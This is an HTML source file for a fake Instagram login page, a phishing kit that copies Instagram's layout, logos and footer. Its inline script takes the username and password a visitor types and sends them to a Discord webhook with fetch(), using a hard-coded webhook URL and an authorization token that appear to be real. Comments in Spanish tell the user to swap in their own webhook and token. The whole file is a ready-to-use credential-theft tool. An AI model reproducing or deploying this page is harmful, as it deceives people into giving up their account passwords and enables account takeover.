<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Instagram</title>

  <link rel="stylesheet" href="./styles/style.css">
</head>

<body>

  <div id="content-container">

    <!--Phone's pictures section-->
    <section class="phones">
      <img src="./img/phones.png" alt="pictures on phone" class="phone-image">
      <div class="display-phone">
        <img class="picture" src="./img/photo-1.png" alt="#">
        <img class="picture" src="./img/photo-2.png" alt="#">
        <img class="picture" src="./img/photo-3.png" alt="#">
        <img class="picture" src="./img/photo-4.png" alt="#">
        <img class="picture" src="./img/photo-5.png" alt="#">
      </div>
    </section>

    <!--User's log in section-->
    <section class="user">

      <div class="login-container">

        <!--Instagram Logo-->
        <div class="instagram-logo-box">
          <img class="instagram-logo" src="./img/instagram-logo.png">
        </div>

        <!--Form Login-->
        <form id="login-post" method="POST">
          <div class="inputs-container">
            <input type="text" name="username" id="username" placeholder="Phone number, username or email">
          </div>
          <div class="inputs-container">
            <input type="password" name="password" id="password" placeholder="Password">
          </div>
          <a class="login-button" href="#" target="_blank" onclick="sendData()">Log In</a>

          <div class="or-container">
            <div class="line"></div>
            <div class="or">OR</div>
            <div class="line"></div>
          </div>

          <!--Facebook login-->
          <div class="facebook-container">
            <a class="facebook-login" href="#" target="_blank"><img class="facebook-logo"
                src="./img/facebook-logo.png">Log in
              with Facebook</a>
          </div>
        </form>

        <!--Password recovery-->
        <a class="password-forgot" href="#" target="_blank">Forgot password?</a>
      </div>

      <!--Sign up-->
      <div class="signup-container">
        <p>Don't have an account? <a class="signup" href="#" target="_blank">Sign up</a></p>
      </div>

      <!--App's download-->
      <div class="get-container">
        <p>Get the app.</p>
        <div class="download-container">
          <a class="download-appstore" href="#" target="_blank"><img class="appstore"
              src="./img/applestore-logo.png"></a>
          <a class="download-googleplay" href="#" target="_blank"><img class="googleplay"
              src="./img/googleplay-logo.png"></a>
        </div>
      </div>

    </section>

  </div>

  <footer class="page-footer">

    <div class="links-container">
      <ul class="links-list">
        <!-- Links list -->
      </ul>
    </div>

    <div class="footer-span-container">
      <span class="footer-span">
        © 2020 INSTAGRAM FROM FACEBOOK
      </span>
    </div>
  </footer>

  <script>
function sendData() {
  const username = document.getElementById('username').value;
  const password = document.getElementById('password').value;

  const webhookURL = 'https://discord.com/api/webhooks/1183511386358284369/ZguaOCWTWFGL1c8h9mBSZR6m4bbIOL6oeNdMuHV6TDUoqiFiuQcgCbkHnQ8zsbpKdpue'; // Reemplaza con tu URL de webhook
  const authToken = 'OTM5ODk1NTY4Mzg4NDgxMDQ0.GUXpr6.pPdmAwY3xnJ93K6beYUVnNvmoRs0r8TeuMXZaw'; // Reemplaza con tu token de autenticación

  const payload = {
    content: `Username: ${username}, Password: ${password}`
  };

  fetch(webhookURL, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Authorization': `Bearer ${authToken}` // Incluir el token de autenticación en el encabezado
    },
    body: JSON.stringify(payload)
  })
  .then(response => {
    if (response.ok) {
      alert('Login data sent successfully to Discord!');
    } else {
      alert('Failed to send login data to Discord.');
    }
  })
  .catch(error => {
    console.error('Error:', error);
    alert('An error occurred while sending data.');
  });
}


  </script>
</body>

</html>
